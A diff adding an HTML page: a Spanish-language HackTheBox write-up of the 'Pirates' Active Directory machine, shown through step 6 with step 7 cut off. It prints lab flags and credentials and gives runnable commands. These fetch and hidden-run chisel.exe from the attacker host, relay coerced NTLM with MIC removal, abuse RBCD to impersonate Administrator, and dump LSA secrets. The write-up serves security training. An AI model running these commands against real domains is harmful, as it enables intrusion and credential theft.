@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pirates — HTB Machine Writeup | Yoandy Ramirez Delgado</title>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --ink:#0b1a10;--forest:#0f2318;--pine:#163020;--moss:#1e4030;--sage:#2a6048;
+  --green:#00e87a;--green2:rgba(0,232,122,.15);--green3:rgba(0,232,122,.06);
+  --cream:#f2ede4;--cream2:#faf7f1;
+  --text:#c8f0dc;--text2:rgba(200,240,220,.65);--text3:rgba(200,240,220,.35);
+  --card:#0d2215;--card2:#112b1c;--border:rgba(0,232,122,.1);
+  --red:#f87171;--yellow:#fbbf24;--blue:#60a5fa;--purple:#a78bfa;--orange:#fb923c;--cyan:#22d3ee;
+  --bb:'Bebas Neue',sans-serif;--dm:'DM Sans',sans-serif;--mo:'JetBrains Mono',monospace;
+  --accent:#00e87a;--bg:#0b1a10;--bg2:#0f2318;--bg3:#163020;
+  --text-muted:rgba(200,240,220,.35);--text-dim:rgba(200,240,220,.65);
+  --green4:#4ade80;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;}
+body{background:var(--ink);color:var(--text);font-family:var(--dm);line-height:1.7;font-size:15px;}
+a{color:var(--green);text-decoration:none;}
+code{background:var(--card2);padding:.15rem .4rem;border-radius:3px;font-family:var(--mo);font-size:.88em;color:var(--green);}
+pre{margin:0;white-space:pre-wrap;word-break:break-all;font-family:var(--mo);}
+ul{padding-left:1.5rem;}li{margin:.35rem 0;}
+h2{font-family:var(--bb);font-size:1.6rem;color:var(--text);border-bottom:1px solid var(--border);padding-bottom:.5rem;margin-bottom:1.25rem;letter-spacing:.04em;}
+h3{font-size:1.05rem;color:var(--text);margin-bottom:.75rem;font-weight:600;}
+
+/* ─── HERO ─── */
+.hero {
+  background: linear-gradient(135deg, var(--forest) 0%, var(--ink) 50%, #091a10 100%);
+  border-bottom: 1px solid var(--border);
+  padding: 60px 40px 50px;
+  position: relative;
+  overflow: hidden;
+}
+.hero::before {
+  content: '';
+  position: absolute; inset: 0;
+  background-image: linear-gradient(rgba(0,232,122,0.03) 1px, transparent 1px),
+                    linear-gradient(90deg, rgba(0,232,122,0.03) 1px, transparent 1px);
+  background-size: 56px 56px;
+  pointer-events: none;
+}
+.hero-layout {
+  max-width: 1200px; margin: 0 auto;
+  display: grid; grid-template-columns: 1fr 280px; gap: 48px; align-items: center;
+}
+@media(max-width: 900px) {
+  .hero-layout { grid-template-columns: 1fr; }
+  .hero-orb { order: -1; justify-self: center; }
+  .hero-meta { justify-content: center; }
+  .hero-sub { margin-left: auto; margin-right: auto; }
+  .hero-stats { justify-content: center; }
+}
+.hero-left { position: relative; z-index: 2; }
+.hero-brand {
+  font-family: var(--mo); font-size: 0.65rem;
+  color: rgba(0,232,122,0.45); letter-spacing: 0.2em; margin-bottom: 16px;
+  display: flex; align-items: center; gap: 8px;
+}
+.hero-brand-dot {
+  width: 6px; height: 6px; border-radius: 50%; background: var(--green);
+  box-shadow: 0 0 10px var(--green); animation: hpd 1.2s infinite alternate;
+}
+@keyframes hpd { to { opacity: 0.2; transform: scale(0.5); } }
+.hero h1 {
+  font-family: var(--bb); font-size: clamp(2.4rem, 4vw, 3.5rem);
+  font-weight: 400; letter-spacing: 0.04em; margin-bottom: 14px; line-height: 1;
+  color: var(--text);
+}
+.hero h1 span { color: var(--green); }
+.hero-sub {
+  color: var(--text2); font-size: 0.95rem; max-width: 600px;
+  margin-bottom: 24px; line-height: 1.7; font-weight: 300;
+}
+.hero-meta {
+  display: flex; align-items: center; gap: 8px; flex-wrap: wrap; margin-bottom: 18px;
+}
+.tag {
+  display: inline-flex; align-items: center; gap: 5px;
+  padding: 4px 12px; border-radius: 4px;
+  font-family: var(--mo);
+  font-size: 10px; font-weight: 500; letter-spacing: 0.8px; text-transform: uppercase;
+}
+.tag-platform { background: rgba(0,232,122,0.1); color: var(--green); border: 1px solid rgba(0,232,122,0.25); }
+.tag-category { background: rgba(56,217,245,0.08); color: var(--cyan); border: 1px solid rgba(56,217,245,0.2); }
+.tag-diff-hard { background: rgba(248,113,113,0.08); color: var(--red); border: 1px solid rgba(248,113,113,0.2); }
+.tag-os { background: rgba(167,139,250,0.08); color: var(--purple); border: 1px solid rgba(167,139,250,0.2); }
+.hero-stats {
+  display: flex; gap: 28px; flex-wrap: wrap;
+}
+.stat { display: flex; flex-direction: column; gap: 2px; }
+.stat-label {
+  font-family: var(--mo);
+  font-size: 9px; text-transform: uppercase; letter-spacing: 1.5px; color: var(--text3);
+}
+.stat-value { font-size: 1rem; font-weight: 700; color: var(--text); }
+.stat-value.green { color: var(--green); }
+
+/* Atom Orb */
+.hero-orb { display: flex; align-items: center; justify-content: center; position: relative; }
+.orb-canvas-wrap { position: relative; width: 260px; height: 260px; }
+#atomOrb { width: 100%; height: 100%; }
+
+/* ─── LAYOUT ─── */
+.container{display:grid;grid-template-columns:1fr 300px;gap:2rem;max-width:1200px;margin:2rem auto;padding:0 1.5rem;}
+@media(max-width:900px){.container{grid-template-columns:1fr;}}
+
+/* ─── SECTIONS ─── */
+.section{margin:2.5rem 0;}
+.step-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.step-number{font-size:.7rem;color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:3px;margin-bottom:.4rem;font-family:var(--mo);}
+.why-box{background:rgba(0,232,122,.05);border-left:3px solid rgba(0,232,122,.4);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.why-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.why-box p{font-size:.9rem;color:var(--text2);}
+.warn-box{background:rgba(251,191,36,.05);border-left:3px solid rgba(251,191,36,.4);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.warn-box strong{color:var(--yellow);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.warn-box p{font-size:.9rem;color:var(--text2);}
+.cmd-annotated{background:rgba(5,14,8,.9);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);margin:1rem 0;border:1px solid var(--border);overflow-x:auto;}
+.cmd-line{font-size:.92rem;line-height:2;white-space:pre-wrap;word-break:break-all;}
+.cmd{color:var(--green);font-weight:700;}.flag-opt{color:var(--yellow);}.ip{color:var(--orange);}.param{color:var(--cyan);}
+.user-c{color:var(--purple);}.str-c{color:var(--green);}.comment-c{color:var(--text3);}
+.cmd-notes{margin-top:.75rem;padding-top:.75rem;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:.3rem;}
+.cmd-note{font-size:.8rem;color:var(--text2);padding:.3rem .75rem;border-left:2px solid var(--border);}
+.output-box{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1rem 1.25rem;font-family:var(--mo);font-size:.82rem;color:var(--text2);margin:1rem 0;overflow-x:auto;line-height:1.6;white-space:pre-wrap;word-break:break-all;}
+.output-label{font-size:.65rem;color:var(--text3);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;}
+.interpret-box{background:rgba(0,232,122,.05);border-left:3px solid var(--green);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.interpret-box strong{color:var(--green);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.interpret-box p,.interpret-box li{font-size:.88rem;color:var(--text2);}
+.decision-box{background:rgba(251,146,60,.05);border-left:3px solid var(--orange);padding:.9rem 1rem;border-radius:0 8px 8px 0;margin:1rem 0;}
+.decision-box strong{color:var(--orange);font-size:.8rem;text-transform:uppercase;letter-spacing:.05em;display:block;margin-bottom:.4rem;}
+.decision-box p{font-size:.88rem;color:var(--text2);}
+.info-box{background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:1.25rem;margin:1.25rem 0;}
+.info-box p{font-size:.9rem;color:var(--text2);}
+.vuln-card{background:rgba(248,113,113,.05);border:1px solid rgba(248,113,113,.2);border-radius:12px;padding:1.5rem;margin:1.5rem 0;}
+.vuln-card h3{color:var(--red);margin-bottom:.75rem;}
+.data-table{width:100%;border-collapse:collapse;font-size:.85rem;margin:1rem 0;}
+.data-table th{background:var(--card2);color:var(--text3);padding:.6rem 1rem;text-align:left;font-size:.75rem;text-transform:uppercase;}
+.data-table td{padding:.6rem 1rem;border-bottom:1px solid var(--border);}
+.data-table tr:last-child td{border-bottom:none;}
+.data-table .highlight{color:var(--green);font-weight:600;}
+.sev-c{color:var(--red);font-weight:700;}.sev-h{color:var(--orange);font-weight:700;}
+.lessons-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
+@media(max-width:700px){.lessons-grid{grid-template-columns:1fr;}}
+.lesson-card{background:var(--card2);border-radius:10px;padding:1.25rem;border:1px solid var(--border);}
+.lesson-card h4{font-size:.85rem;margin-bottom:.75rem;}
+.lesson-card.attacker h4{color:var(--orange);}
+.lesson-card.defender h4{color:var(--cyan);}
+.lesson-card li{font-size:.83rem;color:var(--text2);}
+.flag-box{background:linear-gradient(135deg,rgba(0,232,122,.06),rgba(0,232,122,.02));border:1px solid rgba(0,232,122,.25);border-radius:14px;padding:2rem;text-align:center;margin:2.5rem 0;}
+.flag-label{font-size:.75rem;color:var(--text3);text-transform:uppercase;letter-spacing:3px;margin-bottom:.75rem;font-family:var(--mo);}
+.flag-value{font-family:var(--mo);font-size:1.1rem;color:var(--green);background:rgba(0,232,122,.08);padding:.6rem 1.5rem;border-radius:8px;display:inline-block;border:1px solid rgba(0,232,122,.2);}
+
+/* ASCII diagram */
+.ascii-box{background:rgba(5,14,8,.9);border:1px solid var(--border);border-radius:8px;padding:1.25rem;font-family:var(--mo);font-size:.78rem;color:var(--text2);margin:1rem 0;overflow-x:auto;white-space:pre;line-height:1.5;}
+.ascii-box .n{color:var(--green);font-weight:600;}
+.ascii-box .a{color:var(--blue);}
+.ascii-box .r{color:var(--red);}
+
+/* ─── SIDEBAR ─── */
+.sidebar{position:sticky;top:2rem;height:fit-content;}
+.sidebar-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:1.25rem;margin-bottom:1rem;}
+.sidebar-card h4{margin:0 0 .9rem;font-size:.72rem;text-transform:uppercase;letter-spacing:2px;color:var(--text3);font-family:var(--mo);}
+.meta-row{display:flex;justify-content:space-between;align-items:center;font-size:.83rem;padding:.45rem 0;border-bottom:1px solid var(--border);}
+.meta-row:last-child{border-bottom:none;}
+.meta-label{color:var(--text3);}.meta-value{color:var(--text);font-weight:600;font-family:var(--mo);font-size:.8rem;word-break:break-all;}
+.mitre-tag{display:inline-block;background:rgba(167,139,250,.08);color:var(--purple);border:1px solid rgba(167,139,250,.2);border-radius:4px;padding:.2rem .5rem;font-size:.72rem;font-family:var(--mo);margin:.2rem .15rem;}
+.tl{border-left:2px solid var(--border);padding-left:16px;margin-left:6px;}
+.tli{position:relative;margin-bottom:14px;}
+.tli:last-child{margin-bottom:0;}
+.tli::before{content:'';position:absolute;left:-23px;top:7px;width:8px;height:8px;border-radius:50%;background:var(--green);border:2px solid var(--bg);}
+.tlt{color:var(--text3);font-size:10px;text-transform:uppercase;letter-spacing:.3px;font-family:var(--mo);}
+.tln{color:var(--text);font-weight:600;margin:2px 0;font-size:.82rem;}
+.tld{color:var(--text2);font-size:.75rem;}
+.glosario-item{padding:.5rem 0;border-bottom:1px solid var(--border);font-size:.8rem;}
+.glosario-item:last-child{border-bottom:none;}
+.glosario-term{color:var(--cyan);font-weight:600;font-family:var(--mo);display:block;margin-bottom:.15rem;}
+.glosario-def{color:var(--text3);line-height:1.4;}
+</style>
+</head>
+<body>
+
+<!-- ═══ HERO ═══ -->
+<div class="hero">
+  <div class="hero-layout">
+    <div class="hero-left">
+      <div class="hero-brand"><span class="hero-brand-dot"></span>HEINDALL // WRITEUP</div>
+      <div class="hero-meta">
+        <span class="tag tag-platform">HackTheBox</span>
+        <span class="tag tag-category">Active Directory</span>
+        <span class="tag tag-diff-hard">Hard</span>
+        <span class="tag tag-os">Windows</span>
+      </div>
+      <h1><span>Pirates</span> — Windows AD Domain Compromise</h1>
+      <p class="hero-sub">Máquina Windows Active Directory de dificultad Hard. Cadena de 8 técnicas avanzadas de AD: Pre-W2K password abuse, gMSA hash extraction, Chisel SOCKS5, NTLM Relay con CVE-2019-1040, RBCD + S4U2Proxy, LSA Secrets dump, ForceChangePassword y KCD + SPN Hijacking → DCSync → dominio comprometido.</p>
+      <div class="hero-stats">
+        <div class="stat"><span class="stat-label">DC01</span><span class="stat-value green">10.129.244.95</span></div>
+        <div class="stat"><span class="stat-label">WEB01</span><span class="stat-value">192.168.100.2</span></div>
+        <div class="stat"><span class="stat-label">Dominio</span><span class="stat-value">pirate.htb</span></div>
+        <div class="stat"><span class="stat-label">Fases</span><span class="stat-value">8</span></div>
+        <div class="stat"><span class="stat-label">CVEs</span><span class="stat-value">3</span></div>
+      </div>
+    </div>
+    <!-- Atom Orb -->
+    <div class="hero-orb">
+      <div class="orb-canvas-wrap">
+        <canvas id="atomOrb"></canvas>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="container">
+<main>
+
+<!-- FLAGS -->
+<div class="section">
+  <h2>🚩 Flags</h2>
+  <div class="flag-box">
+    <div class="flag-label">User Flag — WEB01 › C:\Users\a.white\Desktop\user.txt</div>
+    <div class="flag-value">6ab389236172453a8e7ee30d7e35b9f5</div>
+  </div>
+  <div class="flag-box" style="margin-top:1rem;">
+    <div class="flag-label">Root Flag — DC01 › C:\Users\Administrator\Desktop\root.txt</div>
+    <div class="flag-value">153153258a8987f7afdc74f3eae0817e</div>
+  </div>
+</div>
+
+<!-- RESUMEN -->
+<div class="section">
+  <h2>Resumen Ejecutivo</h2>
+  <div class="info-box">
+    <p>Pirates es una máquina Windows Active Directory de dificultad Hard. Partiendo con credenciales de bajo privilegio (<span class="highlight" style="color:var(--green);font-weight:600;">pentest:p3nt3st2025!&amp;</span>), la cadena de ataque encadena 8 técnicas avanzadas de AD:</p>
+    <br>
+    <p>
+      <strong style="color:var(--text)">1.</strong> Explotación del grupo <em>Pre-Windows 2000 Compatible Access</em> para obtener TGT de MS01$ con contraseña trivial.<br>
+      <strong style="color:var(--text)">2.</strong> Extracción de hashes NTLM de cuentas gMSA vía LDAPS autenticado con Kerberos.<br>
+      <strong style="color:var(--text)">3.</strong> Tunneling a red interna mediante Chisel SOCKS5 a través del DC01.<br>
+      <strong style="color:var(--text)">4.</strong> NTLM Relay con eliminación de MIC (CVE-2019-1040) para configurar RBCD en WEB01.<br>
+      <strong style="color:var(--text)">5.</strong> S4U2Self + S4U2Proxy para impersonar Administrator en WEB01 → <em>user.txt</em>.<br>
+      <strong style="color:var(--text)">6.</strong> Extracción de credenciales LSA plaintext: contraseña de a.white.<br>
+      <strong style="color:var(--text)">7.</strong> Abuso de ForceChangePassword para comprometer a.white_adm.<br>
+      <strong style="color:var(--text)">8.</strong> KCD con Protocol Transition + SPN Hijacking en DC01$ → DCSync → <em>root.txt</em>.
+    </p>
+  </div>
+</div>
+
+<!-- DIAGRAMA DE RED -->
+<div class="section">
+  <h2>🗺️ Diagrama de Red</h2>
+  <div class="ascii-box"><span class="n">ATACANTE (Kali)</span>                       <span class="a">DOMINIO pirate.htb</span>
+10.10.14.154                            ┌────────────────────────────────────┐
+        │                               │  <span class="n">DC01</span>  10.129.244.95              │
+        │◄── VPN tun0 ─────────────────►│  Windows Server 2019               │
+        │                               │  AD DS │ KDC │ LDAP │ DNS          │
+        │                               │  gMSA_ADCS_prod$ → WinRM :5985    │
+        │                               │  eth0: 10.129.244.95               │
+        │                               │  eth1: 192.168.100.1 (interna)     │
+        │                               └──────────────┬─────────────────────┘
+        │                                              │ 192.168.100.0/24
+        │◄── Chisel SOCKS5 (127.0.0.1:1080) ──────────┤ (red interna)
+        │                                              │
+        │                               ┌──────────────▼─────────────────────┐
+        │                               │  <span class="n">WEB01</span>  192.168.100.2             │
+        │                               │  Windows Server 2019               │
+        │                               │  ADFS │ WID │ IIS                  │
+        │                               │  SMB signing: <span class="r">False</span>               │
+        │                               │  user.txt: C:\Users\a.white\Desktop │
+        │                               └────────────────────────────────────┘</div>
+</div>
+
+<!-- VULNERABILIDADES -->
+<div class="section">
+  <h2>⚠️ Vulnerabilidades Explotadas</h2>
+  <table class="data-table">
+    <tr><th>Técnica / CVE</th><th>Severidad</th><th>Servicio</th><th>Descripción</th></tr>
+    <tr><td>Pre-W2K Password Reuse</td><td><span class="sev-h">ALTA</span></td><td>Active Directory</td><td>Cuentas de máquina con flag Pre-W2K mantienen contraseña = sAMAccountName.</td></tr>
+    <tr><td>gMSA Privilege Misconfig</td><td><span class="sev-h">ALTA</span></td><td>LDAPS / AD</td><td>MS01$ pertenece al grupo que puede leer passwords de gMSA → hashes NTLM.</td></tr>
+    <tr><td>CVE-2019-1040 (Remove MIC)</td><td><span class="sev-c">CRÍTICA</span></td><td>NTLM / SMB</td><td>MIC eliminable en NTLM AUTHENTICATE → relay a LDAP → escritura RBCD en WEB01$.</td></tr>
+    <tr><td>RBCD</td><td><span class="sev-c">CRÍTICA</span></td><td>Active Directory</td><td>S4U2Proxy permite impersonar cualquier usuario en WEB01 con cuenta creada por relay.</td></tr>
+    <tr><td>LSA Plaintext Credentials</td><td><span class="sev-c">CRÍTICA</span></td><td>WEB01 LSA Secrets</td><td>Contraseña AutoLogon de a.white almacenada en texto plano en LSA Secrets.</td></tr>
+    <tr><td>ForceChangePassword ACE</td><td><span class="sev-h">ALTA</span></td><td>AD ACLs</td><td>a.white tiene ForceChangePassword sobre a.white_adm → escalada sin conocer la pass actual.</td></tr>
+    <tr><td>KCD + SPN Hijacking</td><td><span class="sev-c">CRÍTICA</span></td><td>Kerberos / AD</td><td>a.white_adm con KCD T2A4D + WriteSPN en DC01$ → SPN Hijack → DCSync.</td></tr>
+  </table>
+</div>
+
+<!-- ═══ EXPLOTACIÓN ═══ -->
+<div class="section">
+  <h2>🔐 Explotación Paso a Paso</h2>
+
+  <!-- PASO 1 -->
+  <div class="step-box">
+    <div class="step-number">Paso 1 — Pre-Windows 2000 Compatible Access — TGT para MS01$</div>
+    <div class="why-box">
+      <strong>¿Qué es el grupo Pre-Windows 2000 Compatible Access?</strong>
+      <p>En entornos heredados de Windows NT, las cuentas de máquina creadas con ese flag tienen como contraseña inicial el propio nombre de la cuenta en minúsculas (sin el $). Si el administrador nunca cambia esa contraseña, cualquier atacante puede autenticarse como esa cuenta.</p>
+    </div>
+    <div class="warn-box">
+      <strong>⚠️ Clock Skew — Sincronizar reloj SIEMPRE antes de Kerberos</strong>
+      <p>Kerberos requiere que el reloj del atacante no difiera más de 5 minutos del KDC. Esta máquina tiene un offset de +7 horas. Ejecutar <code>sudo ntpdate -u DC_IP</code> antes de cada operación.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># Sincronizar reloj con el DC</span>
+<span class="cmd">$</span> sudo ntpdate -u <span class="ip">10.129.244.95</span>
+
+<span class="comment-c"># Verificar cuentas Pre-W2K</span>
+<span class="cmd">$</span> nxc ldap <span class="ip">10.129.244.95</span> <span class="flag-opt">-u</span> <span class="str-c">'pentest'</span> <span class="flag-opt">-p</span> <span class="str-c">$'p3nt3st2025!&'</span> <span class="flag-opt">-d</span> pirate.htb <span class="flag-opt">-M</span> pre2k
+
+<span class="comment-c"># Obtener TGT para MS01$ con contraseña trivial</span>
+<span class="cmd">$</span> impacket-getTGT pirate.htb/<span class="user-c">'MS01$'</span>:<span class="str-c">ms01</span> <span class="flag-opt">-dc-ip</span> <span class="ip">10.129.244.95</span></div>
+    </div>
+    <div class="output-box"><div class="output-label">Output</div>[*] Saving ticket in MS01$.ccache</div>
+    <div class="interpret-box">
+      <strong>Interpretación</strong>
+      <p>TGT obtenido para MS01$. Con este ticket realizamos operaciones LDAP autenticadas como esa cuenta de máquina, que pertenece al grupo "Domain Secure Servers" con permiso para leer contraseñas gMSA.</p>
+    </div>
+  </div>
+
+  <!-- PASO 2 -->
+  <div class="step-box">
+    <div class="step-number">Paso 2 — Extracción de hashes NTLM de cuentas gMSA vía LDAPS</div>
+    <div class="why-box">
+      <strong>¿Qué son las gMSA?</strong>
+      <p>Group Managed Service Accounts: cuentas especiales de AD cuya contraseña gestiona automáticamente el DC. Solo los objetos listados en <code>msDS-ManagedPasswordAllowedTo</code> pueden leer el hash NTLM actual.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">$</span> export KRB5CCNAME=/home/kali/MS01\$.ccache
+
+<span class="cmd">$</span> nxc ldap <span class="ip">10.129.244.95</span> <span class="flag-opt">-u</span> <span class="user-c">'MS01$'</span> <span class="flag-opt">-p</span> <span class="str-c">ms01</span> <span class="flag-opt">-d</span> pirate.htb <span class="flag-opt">--gmsa</span> <span class="flag-opt">-k</span></div>
+    </div>
+    <div class="output-box"><div class="output-label">Output</div>LDAP  DC01  [+] pirate.htb\MS01$:ms01
+LDAP  DC01  [*] Getting GMSA Passwords
+LDAP  DC01  Account: gMSA_ADCS_prod$   NTLM: <span style="color:var(--green);font-weight:700;">25c7f0eb586ed3a91375dbf2f6e4a3ea</span>
+LDAP  DC01  Account: gMSA_ADFS_prod$   NTLM: <span style="color:var(--green);font-weight:700;">fd9ea7ac7820dba5155bd6ed2d850c09</span></div>
+    <div class="interpret-box">
+      <strong>Interpretación</strong>
+      <p>Obtenemos los hashes NTLM de ambas gMSA. <code>gMSA_ADCS_prod$</code> da acceso WinRM al DC01; <code>gMSA_ADFS_prod$</code> da acceso WinRM a WEB01 vía túnel.</p>
+    </div>
+    <div class="decision-box"><strong>Decisión</strong><p>Usamos <code>gMSA_ADCS_prod$</code> (hash 25c7f0eb…) para conectar al DC01 via Evil-WinRM y desplegar Chisel hacia la red interna.</p></div>
+  </div>
+
+  <!-- PASO 3 -->
+  <div class="step-box">
+    <div class="step-number">Paso 3 — WinRM a DC01 + Despliegue de Chisel SOCKS5 hacia WEB01</div>
+    <div class="why-box">
+      <strong>¿Por qué necesitamos Chisel?</strong>
+      <p>WEB01 (192.168.100.2) está en una red interna no alcanzable desde Kali. Chisel actúa como proxy SOCKS5 inverso a través del DC01 dual-homed.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># Kali: iniciar servidor Chisel en reverso</span>
+<span class="cmd">$</span> chisel server <span class="flag-opt">-p</span> 8888 <span class="flag-opt">--reverse</span>
+
+<span class="comment-c"># Servir chisel.exe via HTTP</span>
+<span class="cmd">$</span> python3 -m http.server 9090 &amp;
+
+<span class="comment-c"># Conectar al DC01 y ejecutar cliente Chisel</span>
+<span class="cmd">$</span> printf 'Invoke-WebRequest "http://10.10.14.154:9090/chisel.exe" -OutFile "C:\\Windows\\Temp\\chisel.exe"\nStart-Process "C:\\Windows\\Temp\\chisel.exe" -Args "client 10.10.14.154:8888 R:1080:socks" -WindowStyle Hidden\nexit\n' | evil-winrm <span class="flag-opt">-i</span> <span class="ip">10.129.244.95</span> <span class="flag-opt">-u</span> <span class="user-c">'gMSA_ADCS_prod$'</span> <span class="flag-opt">-H</span> <span class="str-c">'25c7f0eb586ed3a91375dbf2f6e4a3ea'</span></div>
+    </div>
+    <div class="output-box"><div class="output-label">Output</div>2026/03/31 server: session#1: tun: proxy#R:1080=>socks: Listening</div>
+    <div class="interpret-box">
+      <strong>Interpretación</strong>
+      <p>Proxy SOCKS5 activo en 127.0.0.1:1080. Cualquier comando con <code>proxychains -q</code> tiene acceso a la red 192.168.100.0/24.</p>
+    </div>
+  </div>
+
+  <!-- PASO 4 -->
+  <div class="step-box">
+    <div class="step-number">Paso 4 — NTLM Relay + RBCD — CVE-2019-1040</div>
+    <div class="why-box">
+      <strong>¿Cómo funciona este ataque?</strong>
+      <p><strong>(1) CVE-2019-1040:</strong> Permite eliminar el MIC del NTLM AUTHENTICATE → relay a LDAP sin signing.<br>
+      <strong>(2) RBCD:</strong> machineAccountQuota permite crear cuentas de máquina. Relay la auth de WEB01$ al LDAP del DC y escribimos RBCD en WEB01$.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="comment-c"># ntlmrelayx: captura auth NTLM de WEB01 → relay al LDAP del DC</span>
+<span class="cmd">$</span> impacket-ntlmrelayx <span class="flag-opt">-t</span> ldap://<span class="ip">10.129.244.95</span> <span class="flag-opt">--remove-mic</span> <span class="flag-opt">--delegate-access</span> <span class="flag-opt">-smb2support</span>
+
+<span class="comment-c"># Coercionar a WEB01 para que autentique hacia Kali</span>
+<span class="cmd">$</span> proxychains -q nxc smb <span class="ip">192.168.100.2</span> <span class="flag-opt">-u</span> <span class="str-c">'pentest'</span> <span class="flag-opt">-p</span> <span class="str-c">$'p3nt3st2025!&'</span> <span class="flag-opt">-d</span> pirate.htb <span class="flag-opt">-M</span> coerce_plus <span class="flag-opt">-o</span> LISTENER=<span class="ip">10.10.14.154</span></div>
+    </div>
+    <div class="output-box"><div class="output-label">Output</div>COERCE_PLUS  WEB01  Exploit Success, efsrpc\EfsRpcAddUsersToFile  [PetitPotam]
+[ntlmrelayx] Authenticating PIRATE/WEB01$@10.129.244.95 against ldap://10.129.244.95 SUCCEED
+[ntlmrelayx] Adding new computer: <span style="color:var(--green);font-weight:700;">AOOMPUJF$</span> password: <span style="color:var(--green);font-weight:700;">5}m2Xd1+_jP5cg3</span> result: OK
+[ntlmrelayx] Delegation rights modified successfully!
+[ntlmrelayx] AOOMPUJF$ can now impersonate users on WEB01$ via S4U2Proxy</div>
+    <div class="interpret-box">
+      <strong>Interpretación</strong>
+      <p>ntlmrelayx creó <code>AOOMPUJF$</code> y habilitó RBCD en WEB01$. El nombre cambia en cada sesión.</p>
+    </div>
+  </div>
+
+  <!-- PASO 5 -->
+  <div class="step-box">
+    <div class="step-number">Paso 5 — S4U2Proxy — Impersonar Administrator en WEB01 → user.txt</div>
+    <div class="why-box">
+      <strong>¿Qué son S4U2Self y S4U2Proxy?</strong>
+      <p><strong>S4U2Self</strong>: obtiene ticket de servicio para sí misma en nombre de cualquier usuario.<br>
+      <strong>S4U2Proxy</strong>: usa ese ticket para solicitar acceso en otros destinos configurados en RBCD → ticket CIFS/WEB01 como Administrator.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">$</span> impacket-getTGT pirate.htb/<span class="user-c">'AOOMPUJF$'</span>:<span class="str-c">'5}m2Xd1+_jP5cg3'</span> <span class="flag-opt">-dc-ip</span> <span class="ip">10.129.244.95</span>
+<span class="cmd">$</span> export KRB5CCNAME=/home/kali/AOOMPUJF\$.ccache
+
+<span class="comment-c"># S4U2Self + S4U2Proxy → ticket CIFS/WEB01 como Administrator</span>
+<span class="cmd">$</span> impacket-getST pirate.htb/<span class="user-c">'AOOMPUJF$'</span>:<span class="str-c">'5}m2Xd1+_jP5cg3'</span> <span class="flag-opt">-spn</span> cifs/WEB01.pirate.htb <span class="flag-opt">-impersonate</span> Administrator <span class="flag-opt">-dc-ip</span> <span class="ip">10.129.244.95</span>
+
+<span class="cmd">$</span> export KRB5CCNAME=/home/kali/Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
+
+<span class="comment-c"># Ejecutar como Administrator en WEB01</span>
+<span class="cmd">$</span> proxychains -q impacket-wmiexec <span class="flag-opt">-k</span> <span class="flag-opt">-no-pass</span> pirate.htb/Administrator@WEB01.pirate.htb <span class="flag-opt">-dc-ip</span> <span class="ip">10.129.244.95</span> <span class="str-c">'type C:\Users\a.white\Desktop\user.txt'</span></div>
+    </div>
+    <div class="output-box"><div class="output-label">Output</div>[*] Impersonating Administrator
+[*] Requesting S4U2self / S4U2Proxy
+[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
+
+pirate\administrator
+<span style="color:var(--green);font-size:1.1rem;font-weight:700;">6ab389236172453a8e7ee30d7e35b9f5</span></div>
+  </div>
+
+  <!-- PASO 6 -->
+  <div class="step-box">
+    <div class="step-number">Paso 6 — LSA Secrets Dump en WEB01 → Contraseña de a.white</div>
+    <div class="why-box">
+      <strong>¿Qué son los LSA Secrets?</strong>
+      <p>Almacén cifrado en el registro de Windows donde el sistema guarda credenciales de servicios y AutoLogon. WEB01 usa AutoLogon con a.white, almacenando su contraseña en texto plano.</p>
+    </div>
+    <div class="cmd-annotated">
+      <div class="cmd-line"><span class="cmd">$</span> proxychains -q nxc smb WEB01.pirate.htb <span class="flag-opt">-u</span> <span class="str-c">'Administrator'</span> <span class="flag-opt">--use-kcache</span> <span class="flag-opt">--lsa</span></div>
+    </div>
+    <div class="output-box"><div class="output-label">Output</div>SMB  WEB01  [+] pirate.htb\Administrator from ccache (Pwn3d!)
+SMB  WEB01  [*] Dumping LSA secrets
+SMB  WEB01  <span style="color:var(--green);font-weight:700;">PIRATE\a.white:E2nvAOKSz5Xz2MJu</span>
+SMB  WEB01  [+] Dumped 9 LSA secrets</div>
+    <div class="interpret-box">
+      <strong>Interpretación</strong>
+      <p>Contraseña en texto claro: <strong style="color:var(--green)">a.white:E2nvAOKSz5Xz2MJu</strong>. Válida en el dominio, punto de entrada al siguiente escalón.</p>
+    </div>
+  </div>
+
+  <!-- PASO 7 -->
+  <div class="step-box">
+    <div class="step-number">Paso 7 — ForceChangePassword: a.white → compromete a.white_adm</div>
+    <div class="why-box">
